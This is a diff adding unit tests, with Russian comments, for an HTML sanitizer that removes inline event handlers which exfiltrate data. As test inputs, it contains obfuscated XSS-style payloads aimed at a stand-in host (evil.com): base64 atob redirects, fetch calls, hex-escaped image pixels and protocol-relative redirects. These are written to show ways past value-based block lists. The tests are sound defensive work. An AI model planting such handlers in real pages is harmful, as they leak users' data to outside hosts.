@@ -48,3 +48,48 @@ describe('stripEventAttrs — все on* по префиксу, вкл. моби
     expect(run(`<button onclick="location.href='http://evil.example/go'">Go</button>`)).not.toContain('evil.example');
   });
 });
+
+describe('stripEventAttrs — обфусцированный/протокол-относительный exfil в on* (2D-2)', () => {
+  // Эти значения НЕ содержат литерального `https?://` и не задевают TRACKER_INLINE_KEYWORDS —
+  // блок-лист по значению их пропускал; ловит только AST inline-exfil анализ.
+  it('протокол-относительный редирект location=\'//evil\' снимается', () => {
+    const out = run(`<div onclick="location='//evil.com/steal'">x</div>`);
+    expect(out).not.toContain('onclick');
+    expect(out).not.toContain('evil.com');
+  });
+
+  it('обфусцированный редирект location=atob(...) снимается', () => {
+    const out = run(`<div onclick="location=atob('aHR0cHM6Ly9ldmlsLmNvbS8=')">x</div>`);
+    expect(out).not.toContain('onclick');
+    expect(out).not.toContain('atob');
+  });
+
+  it('мобильный ontouchstart с fetch(atob(...)) снимается', () => {
+    expect(run(`<div ontouchstart="fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9j'))">x</div>`)).not.toContain('ontouchstart');
+  });
+
+  it('hex-escaped протокол-относительный пиксель new Image().src снимается', () => {
+    const out = run(`<div onmouseover="new Image().src='\\x2f\\x2fevil.com\\x2fp'">x</div>`);
+    expect(out).not.toContain('onmouseover');
+    expect(out).not.toContain('evil.com');
+  });
+
+  it('exfil внутри `return ...` ловится (значение парсится как тело функции)', () => {
+    const out = run(`<form onsubmit="return location='//evil.com'"><input></form>`);
+    expect(out).not.toContain('onsubmit');
+    expect(out).not.toContain('evil.com');
+  });
+
+  // ── СОУНДНОСТЬ: без exfil на чужой хост — обработчик остаётся ──
+  it('onsubmit="return validateForm()" сохранён (return валиден через обёртку-функцию)', () => {
+    expect(run(`<form onsubmit="return validateForm()"><input></form>`)).toContain('return validateForm()');
+  });
+
+  it('same-host протокол-относительная навигация остаётся (не exfil)', () => {
+    expect(run(`<div onclick="location.href='//mysite.com/next'">x</div>`)).toContain('mysite.com/next');
+  });
+
+  it('обработчик с аргументом event без exfil остаётся', () => {
+    expect(run(`<button onclick="track(event)">x</button>`)).toContain('track(event)');
+  });
+});
